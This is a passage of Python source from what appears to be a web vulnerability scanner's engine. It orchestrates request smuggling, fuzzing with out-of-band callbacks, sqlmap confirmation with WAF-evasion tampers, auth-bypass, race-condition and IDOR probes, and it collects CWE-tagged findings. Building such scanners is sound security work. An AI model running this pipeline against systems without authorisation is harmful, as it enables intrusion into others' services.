                        _exif_count = 0
                        for _img_url in _image_urls:
                            if _engine_stop_event.is_set():
                                break
                            try:
                                _img_resp = session.get(
                                    _img_url, timeout=config.get("timeout", 10),
                                )
                                _exif_hits = _exif_scanner.scan(_img_url, _img_resp)
                                for _ef in _exif_hits:
                                    with _lock:
                                        _findings.append({
                                            "agent":         "EXIF Scanner",
                                            "agent_id":      "exif_scanner",
                                            "icon":          "📷",
                                            "phase":         "Deep Discovery",
                                            "severity":      _ef.severity,
                                            "type":          _ef.metadata_type,
                                            "vuln_type":     _ef.metadata_type,
                                            "finding":       _ef.finding,
                                            "url":           _ef.url,
                                            "evidence":      _ef.evidence,
                                            "cwe":           _ef.cwe,
                                        })
                                    _exif_count += 1
                            except Exception:
                                pass
                        if _exif_count:
                            with _engine_lock:
                                _engine_progress["exif_findings"] = _exif_count
                            log.info("[Engine] EXIF Scanner: %d findings from %d images",
                                     _exif_count, len(_image_urls))
                except Exception as _exif_exc:
                    log.debug("[Engine] EXIF Scanner error: %s", _exif_exc)

            # ── WASM Scanner ──
            if not _engine_stop_event.is_set():
                try:
                    wasm_urls = [u for u in sitemap.pages if u.endswith(".wasm")]
                    wasm_scanner_inst = WasmScanner(target=target)
                    wasm_findings = wasm_scanner_inst.scan(target, discovered_urls=wasm_urls or None)
                    for wf in wasm_findings:
                        with _lock:
                            _findings.append({
                                "agent":       "WASM Scanner",
                                "severity":    wf.severity,
                                "type":        getattr(wf, "vuln_type", "wasm_issue"),
                                "finding":     wf.finding,
                                "url":         getattr(wf, "url", target),
                                "cwe":         getattr(wf, "cwe", ""),
                                "remediation": getattr(wf, "remediation", ""),
                            })
                    with _engine_lock:
                        _engine_progress["wasm_findings"] = len(wasm_findings)
                    if wasm_findings:
                        log.info("[Engine] WASM Scanner: %d findings", len(wasm_findings))
                except Exception as _wasm_exc:
                    log.debug("[Engine] WASM Scanner error: %s", _wasm_exc)

            # ── SOAP Scanner — detect WSDL endpoints ──
            if not _engine_stop_event.is_set():
                try:
                    wsdl_urls = [u for u in sitemap.pages
                                 if "wsdl" in u.lower() or "/soap" in u.lower()]
                    if wsdl_urls:
                        soap_scanner = SOAPScanner()
                        for wsdl_url in wsdl_urls[:3]:
                            soap_findings = soap_scanner.scan(session, wsdl_url)
                            for sf in soap_findings:
                                with _lock:
                                    _findings.append({
                                        "agent":       "SOAP Scanner",
                                        "severity":    sf.severity,
                                        "type":        getattr(sf, "vuln_type", "soap_vuln"),
                                        "finding":     sf.finding,
                                        "url":         getattr(sf, "url", wsdl_url),
                                        "cwe":         getattr(sf, "cwe", ""),
                                        "remediation": getattr(sf, "remediation", ""),
                                    })
                        if wsdl_urls:
                            log.info("[Engine] SOAP Scanner: scanned %d WSDL endpoints", len(wsdl_urls[:3]))
                except Exception as _soap_exc:
                    log.debug("[Engine] SOAP Scanner error: %s", _soap_exc)

            # ── HTTP Request Smuggling — full arsenal, auth + unauth coverage ──
            if _HAS_HTTP2_SMUGGLER and not _engine_stop_event.is_set():
                try:
                    _smug_timeout    = config.get("timeout", 10)
                    _smug_rate_limit = config.get("delay", 0.1)
                    _all_pages       = list(sitemap.pages.keys())

                    # ── Authenticated session: all discovered pages (cap 20) ──
                    _smug_auth_urls = [target] + [
                        u for u in _all_pages if u != target
                    ][:19]

                    smuggler_auth = HTTP2Smuggler(
                        target=target,
                        session=session,
                        timeout=_smug_timeout,
                        rate_limit=_smug_rate_limit,
                        stop_event=_engine_stop_event,
                    )
                    auth_findings = smuggler_auth.scan(_smug_auth_urls) or []

                    # ── Unauthenticated session: public-facing endpoints ──
                    # Build a fresh session (no cookies, no auth headers) and probe
                    # URLs that a pre-auth attacker can reach (return 200/3xx without auth).
                    # This catches smuggling on login, registration, and public API paths.
                    import requests as _req_module
                    _unauth_session = _req_module.Session()
                    _unauth_session.verify = False
                    _unauth_session.headers["User-Agent"] = (
                        "Mozilla/5.0 (compatible; DAST-Scanner/1.0)"
                    )

                    # Candidate public URLs: target + common auth-related paths
                    _public_candidates = [target] + [
                        u for u in _all_pages
                        if any(k in u.lower() for k in (
                            "/login", "/signin", "/register", "/signup",
                            "/auth", "/oauth", "/sso", "/forgot",
                            "/reset-password", "/api/health", "/health",
                            "/status", "/", "/home", "/api/v",
                        ))
                    ][:10]

                    # Keep only URLs that actually respond 200/301/302 without auth
                    _unauth_urls: list[str] = []
                    for _pu in _public_candidates:
                        if _engine_stop_event.is_set():
                            break
                        try:
                            _pr = _unauth_session.get(
                                _pu, timeout=5, allow_redirects=False
                            )
                            if _pr.status_code in (200, 301, 302, 307, 308):
                                _unauth_urls.append(_pu)
                        except Exception:
                            pass

                    unauth_findings: list[dict] = []
                    if _unauth_urls and not _engine_stop_event.is_set():
                        smuggler_unauth = HTTP2Smuggler(
                            target=target,
                            session=_unauth_session,
                            timeout=_smug_timeout,
                            rate_limit=_smug_rate_limit,
                            stop_event=_engine_stop_event,
                        )
                        unauth_findings = smuggler_unauth.scan(_unauth_urls) or []
                        # Tag unauth findings so they're distinguishable
                        for uf in unauth_findings:
                            uf["variant"] = uf.get("variant", "") + "_unauth"

                    # ── Record all findings ──
                    all_smug_findings = auth_findings + unauth_findings
                    for hf in all_smug_findings:
                        _record_finding(
                            agent="HTTP Smuggler",
                            finding_text=hf.get("title", hf.get("finding", "")),
                            severity=hf.get("severity", "high"),
                            target=hf.get("url", target),
                            agent_id="http_smuggler",
                            icon="🚇",
                            phase="http_smuggling",
                            extra={
                                "type":    hf.get("type", "http_smuggling"),
                                "cwe":     hf.get("cwe", "CWE-444"),
                                "owasp":   hf.get("owasp", "A08:2025"),
                                "proof":   hf.get("evidence", ""),
                                "variant": hf.get("variant", ""),
                            },
                        )
                    with _engine_lock:
                        _engine_progress["http2_smuggling_findings"] = len(all_smug_findings)
                    if all_smug_findings:
                        log.info(
                            "[Engine] HTTP Smuggler: %d findings "
                            "(%d auth×%d URLs, %d unauth×%d URLs)",
                            len(all_smug_findings),
                            len(auth_findings), len(_smug_auth_urls),
                            len(unauth_findings), len(_unauth_urls),
                        )
                except Exception as _h2_exc:
                    log.debug("[Engine] HTTP Smuggler error: %s", _h2_exc)

            # ── Token randomness analysis ──
            if _HAS_TOKEN_ANALYSIS and not _engine_stop_event.is_set():
                try:
                    # Find auth/login endpoints
                    auth_urls = [u for u in sitemap.pages
                                 if any(k in u.lower() for k in ("/login", "/auth", "/signin", "/session", "/token"))]
                    for auth_url in auth_urls[:3]:
                        token_findings = analyze_session_tokens(auth_url, session, sample_count=20, timeout=10)
                        for tf in (token_findings or []):
                            with _lock:
                                _findings.append({
                                    "agent":    "Token Analyzer",
                                    "severity": tf.get("severity", "Medium"),
                                    "type":     "weak_session_token",
                                    "finding":  tf.get("finding", ""),
                                    "url":      auth_url,
                                })
                except Exception as e:
                    log.debug("[Engine] Token analysis error: %s", e)

        # ── 2.9 Surface consolidation ─────────────────────────────────────────
        # Merge URLs discovered by AJAX spider and forced browse back into the
        # sitemap so the fuzzer sees the full attack surface, not just the BFS crawl.
        if not _engine_stop_event.is_set():
            from modules.crawler import InputSurface as _IS_merge
            from urllib.parse import urlparse as _up_merge, parse_qs as _pqs_merge

            _pre_merge_count = len(sitemap.surfaces)
            _scope_check     = ScopeManager(target)

            def _merge_url_into_sitemap(url: str, source_tag: str):
                """Add a URL as a path surface + extract query params as individual surfaces."""
                if not url or not _scope_check.in_scope(url):
                    return
                sitemap.add_page(url, 0, "", {})  # register in pages map
                # Path surface (for path traversal / forced browse attacks)
                sitemap.add_surface(_IS_merge(
                    url=url, method="GET", param="path",
                    param_type="path", original_value=url,
                ))
                # Query parameters → individual surfaces
                try:
                    parsed = _up_merge(url)
                    for pname, pvals in _pqs_merge(parsed.query).items():
                        sitemap.add_surface(_IS_merge(
                            url=url, method="GET", param=pname,
                            param_type="query", original_value=pvals[0] if pvals else "",
                        ))
                except Exception:
                    pass
                log.debug("[SurfaceMerge] %s → %s", source_tag, url)

            # 1) AJAX spider pages
            ajax_snapshot = list(_ajax_pages)
            for page in ajax_snapshot:
                _merge_url_into_sitemap(
                    page.get("url", "") if isinstance(page, dict) else str(page),
                    "ajax",
                )

            # 2) Forced browse discovered paths (only interesting / non-404 ones)
            browse_snapshot = list(_browse_results)
            for br in browse_snapshot:
                br_dict = br if isinstance(br, dict) else (br.to_dict() if hasattr(br, "to_dict") else {})
                if br_dict.get("status_code", 0) in (200, 201, 204, 301, 302, 307, 401, 403):
                    _merge_url_into_sitemap(br_dict.get("url", ""), "forcebrowse")

            _merged = len(sitemap.surfaces) - _pre_merge_count
            if _merged:
                log.info("[SurfaceMerge] Added %d new surfaces from AJAX spider + forced browse "
                         "(total: %d)", _merged, len(sitemap.surfaces))
            with _engine_lock:
                _engine_progress["surfaces_found"] = len(sitemap.surfaces)
                _engine_progress["pages_crawled"]  = len(sitemap.pages)
            _elog(f"PHASE surface_merge DONE — {len(sitemap.pages)} pages, {len(sitemap.surfaces)} surfaces")

        # ── 3. Fuzz ───────────────────────────────────────────────────────────
        results = []
        if _phase_ok("fuzz"):
            _elog(f"PHASE fuzz START — {len(sitemap.surfaces)} surfaces")
            _engine_status_msg = "fuzzing"
            _engine_progress["phase"] = "fuzzing"

            _oast_inst = None
            try:
                _oast_inst = get_or_start_oast()
            except Exception:
                pass
            # LLM provider for adaptive fuzzing (if API keys configured)
            _fuzz_llm = None
            if _api_keys.get("anthropic") or _api_keys.get("openai"):
                try:
                    _fuzz_llm = LLMProvider(api_keys={
                        "anthropic": _api_keys.get("anthropic", ""),
                        "openai":    _api_keys.get("openai", ""),
                    })
                except Exception:
                    pass

            fuzzer = Fuzzer(
                scope             = scope,
                session           = session,
                timeout           = config.get("timeout", 10),
                rate_limit        = config.get("delay", 0.05),
                max_fuzz_time     = config.get("max_fuzz_time", 0),
                max_surfaces      = config.get("max_surfaces", 1000),
                stop_event        = _engine_stop_event,
                max_per_type      = config.get("max_per_type", 8),
                oast              = _oast_inst,
                tech_fingerprint  = _engine_fingerprint or {},
                llm_provider      = _fuzz_llm,
                allow_dangerous_endpoints = config.get("allow_dangerous_endpoints", False),
            )

            def _fuzz_progress_cb(count):
                _engine_progress["payloads_sent"]   = count
                _engine_progress["surfaces_done"]   = getattr(fuzzer, '_surfaces_done', 0)
                _engine_progress["surfaces_total"]  = getattr(fuzzer, '_surfaces_total', 0)

            # ── Launch external tools in background thread (parallel with fuzzing) ──
            _ext_thread_results = {}
            def _run_ext_tools_bg():
                global _engine_status_msg
                _ext_allowed_bg = config.get("external_tools", True)
                if not (_HAS_EXTERNAL_TOOLS and _ext_allowed_bg and _phase_ok("external_tools")):
                    return
                available = get_available_tools()
                tool_names = [k for k, v in available.items() if v]
                if not tool_names:
                    return
                _engine_progress["external_tools"]      = tool_names
                _engine_progress["tools_ran_last_scan"] = tool_names
                sqli_surfaces_bg = [
                    s for s in sitemap.surfaces
                    if s.param_type in _SQLI_SURFACE_TYPES
                ] if sitemap else []

                def _ext_progress(msg):
                    global _engine_status_msg
                    _engine_progress["external_status"] = msg
                    import re as _re
                    if msg.startswith("nuclei: folder_done"):
                        m = _re.match(r"nuclei: folder_done (\d+)/(\d+) (.+?)(?:\s+\(\d+ findings\))?$", msg)
                        if m:
                            _engine_progress["nuclei_folders_done"]  = int(m.group(1))
                            _engine_progress["nuclei_folders_total"] = int(m.group(2))
                            _engine_progress["nuclei_folder"]        = m.group(3).strip()
                    elif msg.startswith("nuclei: scanning ["):
                        m = _re.match(r"nuclei: scanning \[(\d+)/(\d+)\] (.+)", msg)
                        if m:
                            _engine_progress["nuclei_folders_total"] = int(m.group(2))
                            _engine_progress["nuclei_folders_done"]  = max(0, int(m.group(1)) - 1)
                            _engine_progress["nuclei_folder"]        = m.group(3)
                    elif msg.startswith("nuclei: all folders done"):
                        _engine_progress["nuclei_folders_done"] = _engine_progress.get("nuclei_folders_total", 6)
                        _engine_progress["nuclei_folder"] = "complete"
                    if msg.startswith("sqlmap:"):
                        _engine_progress["current_tool"] = "sqlmap"
                    elif msg.startswith("nuclei:"):
                        _engine_progress["current_tool"] = "nuclei"
                    elif msg.startswith("nmap:"):
                        _engine_progress["current_tool"] = "nmap"

                ext_res = run_all_external_tools(
                    target=target,
                    surfaces=sqli_surfaces_bg or None,
                    sqli_urls=[target] if not sqli_surfaces_bg else None,
                    stop_event=_engine_stop_event,
                    on_progress=_ext_progress,
                    urls=list(sitemap.pages.keys()) if sitemap else None,
                )
                ext_count = 0
                for tool_name, tool_findings in ext_res.items():
                    for f in tool_findings:
                        with _lock:
                            _findings.append(f)
                        ext_count += 1
                    if tool_findings:
                        _engine_progress[f"{tool_name}_findings"] = len(tool_findings)
                _engine_progress["external_findings_count"] = ext_count
                _ext_thread_results.update(ext_res)

            _ext_bg_thread = threading.Thread(target=_run_ext_tools_bg, daemon=True, name="dast-ext-tools")
            _ext_bg_thread.start()

            results = fuzzer.fuzz_all(sitemap.surfaces, on_payload_sent=_fuzz_progress_cb)

            _sqli_cands = set(fuzzer.sqli_candidates)
            _cand_surfaces = [
                s for s in sitemap.surfaces
                if s.url in _sqli_cands and s.param_type in _SQLI_SURFACE_TYPES
            ] if sitemap and _sqli_cands else []
            if (_cand_surfaces
                    and _HAS_EXTERNAL_TOOLS
                    and SqlmapRunner.available()
                    and _phase_ok("external_tools")
                    and not _engine_stop_event.is_set()):
                _engine_status_msg = "sqlmap confirming blind SQLi candidates"
                _waf_report = fuzzer.get_waf_report()
                _sm_dbms = extract_dbms_hint(_findings)
                _sm_tamper = (
                    SqlmapRunner.tamper_for_waf(_waf_report.get("waf_product"))
                    if _waf_report.get("waf_detected") else None
                )
                _sm_results = SqlmapRunner.run_surfaces(
                    _cand_surfaces,
                    dbms=_sm_dbms,
                    tamper=_sm_tamper,
                    stop_event=_engine_stop_event,
                    on_progress=lambda msg: _engine_progress.update(
                        external_status=msg, current_tool="sqlmap"
                    ),
                )
                _sm_count = 0
                for _smf in _sm_results:
                    _smf.setdefault("agent", "sqlmap (blind SQLi confirmation)")
                    with _lock:
                        _findings.append(_smf)
                    _sm_count += 1
                if _sm_count:
                    _engine_progress["external_findings_count"] = (
                        _engine_progress.get("external_findings_count", 0) + _sm_count
                    )

            with _engine_lock:
                # Convert dataclass to dict safely
                _engine_fuzz_results = [
                    {k: v for k, v in r.__dict__.items()} for r in results
                ]
                _engine_progress["findings_count"]  = len(results)
                _engine_progress["payloads_sent"]   = fuzzer._payloads_sent_count

            # ── 4. Merge into main findings list ──────────────────────────────────
            for r in results:
                finding = {
                    "agent":        "Engine Fuzzer",
                    "severity":     r.severity,
                    "type":         r.vuln_type,
                    "finding":      r.finding,
                    "url":          r.url,
                    "param":        r.param,
                    "payload":      r.payload,
                    "evidence_id":  r.evidence_id,
                    "resp_time_ms": r.resp_time_ms,
                    "proof":        r.proof,
                    "proof_data":   r.proof_data,
                    "status_code":  r.status_code,
                }
                with _lock:
                    _findings.append(finding)

        # ── 5. VulnerabilityScanner — specialized OWASP checks + chaining ────
        if not _engine_stop_event.is_set() and _phase_ok("owasp_checks"):
            _elog(f"PHASE owasp_checks START — {len(sitemap.surfaces)} surfaces")
            _engine_status_msg = "running OWASP specialized checks"
            _engine_progress["phase"] = "owasp_checks"

            def _on_scan_finding(sf: "ScanFinding"):  # type: ignore
                with _lock:
                    _findings.append({
                        "agent":            "DAST Scanner",
                        "agent_id":         "scanner",
                        "icon":             "⚙️",
                        "phase":            "Active Scanning",
                        "finding":          sf.finding,
                        "severity":         sf.severity,
                        "target":           sf.url,
                        "url":              sf.url,
                        "param":            sf.param,
                        "payload":          sf.payload,
                        "type":             sf.vuln_type,
                        "owasp":            sf.owasp_category,
                        "cwe":              sf.cwe,
                        "remediation":      sf.remediation,
                        "proof":            sf.proof,
                        "chain_id":         sf.chain_id,
                        "chain_desc":       sf.chain_desc,
                        "evidence_id":      sf.evidence_id,
                        "resp_time_ms":     sf.resp_time_ms,
                        "status_code":      sf.status_code,
                        "confidence_level": sf.confidence_level.value,
                        "ts":               sf.ts,
                    })

            scanner = VulnerabilityScanner(
                target     = target,
                scope      = scope,
                session    = session,
                ev_store   = _ev_store,
                stop_event = _engine_stop_event,
                on_finding = _on_scan_finding,
                timeout    = config.get("timeout", 10),
                rate_limit = config.get("delay", 0.05),
                scan_id    = _active_scan_id or "",
                allow_dangerous_endpoints = config.get("allow_dangerous_endpoints", False),
            )
            scan_findings = scanner.scan(sitemap)

            # Count distinct scanner findings (passive phase is deduplicated)
            with _engine_lock:
                _engine_progress["findings_count"] = len(results) + len(scan_findings)

        # ── 4.5 API Active Testing + Race Condition Testing ───────────────
        if not _engine_stop_event.is_set() and _phase_ok("api_race_testing"):
            _elog(f"PHASE api_race_testing START — {len(sitemap.surfaces)} surfaces")
            _engine_status_msg = "API security & race condition testing"
            _engine_progress["phase"] = "api_race_testing"

            # ── API Active Tester (OWASP API Top-10) ──
            if _HAS_API_TESTER:
                try:
                    api_tester = ApiActiveTester(
                        session=session, scope=scope,
                        timeout=config.get("timeout", 10),
                        rate_limit=config.get("delay", 0.05),
                        allow_dangerous_endpoints=config.get("allow_dangerous_endpoints", False),
                    )
                    api_findings = api_tester.scan(sitemap.surfaces, base_url=target)
                    for af in api_findings:
                        with _lock:
                            _findings.append({
                                "agent":    "API Tester",
                                "severity": af.severity,
                                "type":     af.vuln_type,
                                "finding":  af.finding,
                                "url":      af.url,
                                "param":    getattr(af, 'param', ''),
                                "payload":  getattr(af, 'payload', ''),
                                "cwe":      getattr(af, 'cwe', ''),
                            })
                    with _engine_lock:
                        _engine_progress["api_test_findings"] = len(api_findings)
                except Exception as e:
                    log.debug("[Engine] API tester error: %s", e)

            # ── Race Condition / TOCTOU Testing ──
            if _HAS_RACE and not _engine_stop_event.is_set():
                try:
                    def _on_race_progress(tested: int, total: int, url: str) -> None:
                        with _engine_lock:
                            _engine_progress["race_tested"]     = tested
                            _engine_progress["race_total"]      = total
                            _engine_progress["race_current_url"] = url

                    def _on_race_finding(rf) -> None:
                        with _lock:
                            _findings.append({
                                "agent":          "Race Condition / TOCTOU",
                                "severity":        rf.severity,
                                "type":            "race_condition",
                                "vuln_type":       f"race_{rf.attack_pattern}",
                                "finding":         rf.finding,
                                "url":             rf.url,
                                "proof":           rf.proof,
                                "attack_pattern":  rf.attack_pattern,
                                "concurrency":     rf.concurrency,
                                "h2_confirmed":    rf.h2_confirmed,
                                "state_before":    rf.state_before,
                                "state_after":     rf.state_after,
                                "phase":           "api_race_testing",
                            })

                    with _engine_lock:
                        _engine_progress["race_tested"]     = 0
                        _engine_progress["race_total"]      = 0
                        _engine_progress["race_current_url"] = ""

                    race_tester = RaceConditionTester(
                        session      = session,
                        scope        = scope,
                        timeout      = config.get("timeout", 10),
                        stop_event   = _engine_stop_event,
                        on_finding   = _on_race_finding,
                        on_progress  = _on_race_progress,
                        allow_dangerous_endpoints = config.get("allow_dangerous_endpoints", False),
                    )
                    race_findings = race_tester.scan(target, sitemap)
                    with _engine_lock:
                        _engine_progress["race_findings"] = len(race_findings)
                    log.info("[Engine] Race condition scan: %d findings from %d candidates",
                             len(race_findings), _engine_progress.get("race_total", 0))
                except Exception as e:
                    log.debug("[Engine] Race condition error: %s", e)

            # ── Access Control Matrix Tester ──
            if not _engine_stop_event.is_set():
                try:
                    ac_tester = AccessControlTester()
                    ac_surfaces = filter_dangerous_surfaces(
                        sitemap.surfaces,
                        allow_dangerous_endpoints=config.get("allow_dangerous_endpoints", False),
                    )
                    ac_urls = [(s.url, s.method or "GET") for s in ac_surfaces[:50]]
                    if ac_urls:
                        ac_sessions = {"primary": session}
                        ac_findings = ac_tester.scan(ac_sessions, ac_urls)
                        for af in ac_findings:
                            with _lock:
                                _findings.append({
                                    "agent":       "Access Control Tester",
                                    "severity":    af.severity,
                                    "type":        getattr(af, "vuln_type", "access_control"),
                                    "finding":     af.finding,
                                    "url":         getattr(af, "url", target),
                                    "param":       getattr(af, "param", ""),
                                    "cwe":         getattr(af, "cwe", "CWE-284"),
                                    "remediation": getattr(af, "remediation", ""),
                                })
                        with _engine_lock:
                            _engine_progress["access_control_findings"] = len(ac_findings)
                        log.info("[Engine] Access Control Tester: %d findings", len(ac_findings))
                except Exception as e:
                    log.debug("[Engine] Access Control Tester error: %s", e)

            # ── Auth Bypass Probes — only meaningful on authenticated scans ──
            if _HAS_AUTH_PROBES and _engine_auth_handler and not _engine_stop_event.is_set():
                try:
                    probe_urls = [u for u in list(sitemap.pages.keys())[:30]
                                  if any(k in u.lower() for k in
                                         ("/api/", "/admin", "/user", "/account", "/profile",
                                          "/dashboard", "/settings", "/me"))][:10]
                    auth_bypass_count = 0
                    for p_url in probe_urls:
                        for probe_fn, probe_label, cwe_id in [
                            (probe_no_auth,       "auth_bypass_no_auth",       "CWE-306"),
                            (probe_expired_token, "auth_bypass_expired_token", "CWE-613"),
                            (probe_admin_claim,   "auth_bypass_jwt_claim",     "CWE-285"),
                        ]:
                            try:
                                result = probe_fn(p_url, timeout=config.get("timeout", 10))
                                if result.bypassed:
                                    with _lock:
                                        _findings.append({
                                            "agent":       "Auth Bypass Prober",
                                            "severity":    result.severity,
                                            "type":        probe_label,
                                            "finding":     f"Auth bypass via {result.probe_type}: {result.evidence[:300]}",
                                            "url":         p_url,
                                            "cwe":         cwe_id,
                                            "remediation": "Ensure all sensitive endpoints require valid authentication tokens.",
                                        })
                                    auth_bypass_count += 1
                            except Exception:
                                pass
                    if auth_bypass_count:
                        log.info("[Engine] Auth Bypass Probes: %d bypass(es) found", auth_bypass_count)
                        with _engine_lock:
                            _engine_progress["auth_bypass_found"] = auth_bypass_count
                except Exception as e:
                    log.debug("[Engine] Auth probe error: %s", e)

        # ── Merge intercepted passive findings from ALL phases ────────────────
        if hasattr(session, 'get_findings'):
            intercepted = session.get_findings()
            if intercepted:
                existing_keys = set()
                for f in _passive_findings:
                    existing_keys.add((f.get("url", ""), f.get("category", ""), f.get("finding", "")))
                intercept_count = 0
                for f in intercepted:
                    fd = f.to_dict()
                    key = (fd.get("url", ""), fd.get("category", ""), fd.get("finding", ""))
                    if key not in existing_keys:
                        existing_keys.add(key)
                        _passive_findings.append(fd)
                        with _lock:
                            _findings.append({
                                "agent":    "Passive Scanner (Intercept)",
                                "severity": fd.get("severity", "Info"),
                                "type":     fd.get("category", ""),
                                "detail":   fd.get("finding", ""),
                                "url":      fd.get("url", ""),
                                "ts":       datetime.now(timezone.utc).isoformat(),
                            })
                        intercept_count += 1
                _engine_progress["passive_intercept_count"] = intercept_count

        # ── 5.5 User-Agent Behavioral Diffing ────────────────────────────────
        if not _engine_stop_event.is_set() and _phase_ok("ua_diff") and _HAS_UA_DIFF:
            _engine_status_msg = "User-Agent behavioral diffing"
            _engine_progress["phase"] = "ua_diff"
            try:
                ua_scanner = UADiffScanner(
                    session=session,
                    stop_event=_engine_stop_event,
                    timeout=config.get("timeout", 10),
                )
                ua_findings = ua_scanner.scan(sitemap)
                for uf in ua_findings:
                    uf["agent"] = "UA Diff Scanner"
                    with _lock:
                        _findings.append(uf)
                with _engine_lock:
                    _engine_progress["ua_diff_findings"] = len(ua_findings)
                if ua_findings:
                    log.info("[Engine] UA Diff: %d findings", len(ua_findings))
            except Exception as e:
                log.debug("[Engine] UA Diff error: %s", e)

        # ── 5.6 Business Logic Testing ──────────────────────────────────────
        if not _engine_stop_event.is_set() and _HAS_BIZ_LOGIC and _phase_ok("biz_logic"):
            _engine_status_msg = "testing business logic"
            _engine_progress["phase"] = "biz_logic"
            try:
                _biz_timeout = config.get("timeout", 10)
                _biz_tester = BusinessLogicTester(session=session, timeout=_biz_timeout)
                _post_json_surfaces = [
                    s for s in sitemap.surfaces
                    if getattr(s, "method", "GET") == "POST"
                    and getattr(s, "param_type", "") == "json"
                ]
                for _biz_surf in _post_json_surfaces[:20]:
                    if _engine_stop_event.is_set():
                        break
                    try:
                        _sample = (json.loads(_biz_surf.body_template)
                                   if getattr(_biz_surf, "body_template", None) else {})
                        _biz_tester.auto_scan_endpoint(
                            url=_biz_surf.url,
                            method=_biz_surf.method,
                            sample_data=_sample,
                        )
                    except Exception as _biz_e:
                        log.debug("[Engine] Biz logic error on %s: %s", _biz_surf.url, _biz_e)
                _biz_all = _biz_tester.get_findings()
                for _bfind_dict in _biz_all:
                    _bfind_dict["agent"] = "Business Logic Tester"
                    _bfind_dict["type"] = _bfind_dict.get("vuln_type", "biz_logic")
                    with _lock:
                        _findings.append(_bfind_dict)
                with _engine_lock:
                    _engine_progress["biz_logic_findings"] = len(_biz_all)
                if _biz_all:
                    log.info("[Engine] Business logic: %d findings", len(_biz_all))
            except Exception as _biz_err:
                log.debug("[Engine] Business logic phase error: %s", _biz_err)

        # ── 5.7 BChecks (Burp BCheck DSL auto-scan) ─────────────────────────
        if not _engine_stop_event.is_set() and _HAS_BCHECKS and _phase_ok("bchecks"):
            _bchecks_dir = os.path.join(os.path.dirname(__file__), "bchecks")
            if os.path.isdir(_bchecks_dir):
                _engine_status_msg = "running BChecks"
                _engine_progress["phase"] = "bchecks"
                try:
                    _bc_engine = _BCheckEngine(
                        bchecks_dir=_bchecks_dir,
                        session=session,
                        timeout=config.get("timeout", 10),
                        stop_event=_engine_stop_event,
                    )
                    with _engine_lock:
                        _engine_progress["bchecks_count"] = _bc_engine.check_count
                    if _bc_engine.check_count > 0:
                        _bc_results = _bc_engine.run(sitemap=sitemap, target=target)
                        for _bcf in _bc_results:
                            _bcf["agent"] = "BChecks"
                            with _lock:
                                _findings.append(_bcf)
                        with _engine_lock:
                            _engine_progress["bchecks_findings"] = len(_bc_results)
                        if _bc_results:
                            log.info("[Engine] BChecks: %d findings from %d checks",
                                     len(_bc_results), _bc_engine.check_count)
                except Exception as _bc_err:
                    log.debug("[Engine] BChecks phase error: %s", _bc_err)

        # ── 5.7b YAML BChecks (YAML-defined custom scan rules) ───────────────
        if not _engine_stop_event.is_set() and _HAS_YAML_BCHECKS and _phase_ok("bchecks"):
            _ybc_dir = os.path.join(os.path.dirname(__file__), "bchecks")
            if os.path.isdir(_ybc_dir):
                _engine_status_msg = "running YAML BChecks"
                try:
                    _ybc_engine = _YAMLRuleEngine(
                        bchecks_dir=_ybc_dir,
                        session=session,
                        timeout=config.get("timeout", 10),
                        stop_event=_engine_stop_event,
                    )
                    with _engine_lock:
                        _engine_progress["yaml_bchecks_count"] = _ybc_engine.check_count
                    if _ybc_engine.check_count > 0:
                        _ybc_results = _ybc_engine.run(sitemap=sitemap, target=target)
                        for _ybcf in _ybc_results:
                            with _lock:
                                _findings.append(_ybcf)
                        with _engine_lock:
                            _engine_progress["yaml_bchecks_findings"] = len(_ybc_results)
                        if _ybc_results:
                            log.info("[Engine] YAML BChecks: %d findings from %d rules",
                                     len(_ybc_results), _ybc_engine.check_count)
                except Exception as _ybc_err:
                    log.debug("[Engine] YAML BChecks phase error: %s", _ybc_err)

        # ── 5.8 IDOR / Multi-User Access Control Testing ──────────────────────
        if not _engine_stop_event.is_set() and _HAS_IDOR_TESTS and _phase_ok("idor_tests"):
            _harvested_ids = _id_harvester.get_all_ids() if _id_harvester else []
            if _harvested_ids:
                _engine_status_msg = "testing IDOR and access control"
                _engine_progress["phase"] = "idor_tests"
                try:
                    _idor_scanner = MultiUserScanner(timeout=config.get("timeout", 10))
                    # Always add unauthenticated baseline for comparison
                    _idor_scanner.add_unauth_baseline()
                    # Add the current authenticated session as the reference user
                    if session:
                        _idor_scanner.users.append(UserContext(
                            name="authenticated",
                            role="user",
                            session=session,
                            authenticated=True,
                        ))
                    # Build URL set from harvested object IDs
                    _idor_urls = list({hid.url for hid in _harvested_ids if hid.url})[:50]
                    if _idor_urls and len(_idor_scanner.users) >= 2:
                        _idor_hits = _idor_scanner.compare_access(
                            _idor_urls, timeout=config.get("timeout", 10))
                        for _ifind in _idor_hits:
                            _ifind["agent"] = "IDOR Scanner"
                            with _lock:
                                _findings.append(_ifind)
                        with _engine_lock:
                            _engine_progress["idor_findings"] = len(_idor_hits)
                        if _idor_hits:
                            log.info("[Engine] IDOR: %d findings across %d URLs",
                                     len(_idor_hits), len(_idor_urls))
                except Exception as _idor_err:
                    log.debug("[Engine] IDOR tests error: %s", _idor_err)

        # ── 5.9 WebSocket Security Testing ───────────────────────────────────
        if not _engine_stop_event.is_set() and _HAS_WS and _phase_ok("websocket"):
            _engine_status_msg = "testing WebSocket security"
            _engine_progress["phase"] = "websocket"
            try:
                # Build auth headers from the active session so WS upgrade
                # handshakes reach authenticated endpoints.
                _ws_auth: dict = {}
                if _engine_auth_handler:
                    _ah_sess = _engine_auth_handler.session
                    _auth_val = _ah_sess.headers.get("Authorization", "")
                    if _auth_val:
                        _ws_auth["Authorization"] = _auth_val
                    _cookie_str = "; ".join(
                        f"{c.name}={c.value}" for c in _ah_sess.cookies
                    )
                    if _cookie_str:
                        _ws_auth["Cookie"] = _cookie_str

                _ws_scanner = _WebSocketScanner(
                    target=target,
                    stop_event=_engine_stop_event,
                    timeout=config.get("timeout", 10),
                    auth_headers=_ws_auth or None,
                )
                # Pass any ws/wss hint URLs discovered during crawl
                _ws_extra = [
                    u for u in sitemap.pages
                    if u.startswith("ws://") or u.startswith("wss://")
                ]
                _ws_hits = _ws_scanner.scan(extra_urls=_ws_extra or None)
                for _wf in _ws_hits:
                    _wf["agent"] = "WebSocket Scanner"
                    with _lock:
                        _findings.append(_wf)
                with _engine_lock:
                    _engine_progress["websocket_findings"] = len(_ws_hits)
                if _ws_hits:
                    log.info("[Engine] WebSocket: %d findings", len(_ws_hits))
            except Exception as _ws_err:
                log.debug("[Engine] WebSocket phase error: %s", _ws_err)

        # ── 5.10 GraphQL Security Testing ────────────────────────────────────
        if not _engine_stop_event.is_set() and _HAS_GQL and _phase_ok("graphql"):
            _engine_status_msg = "testing GraphQL security"
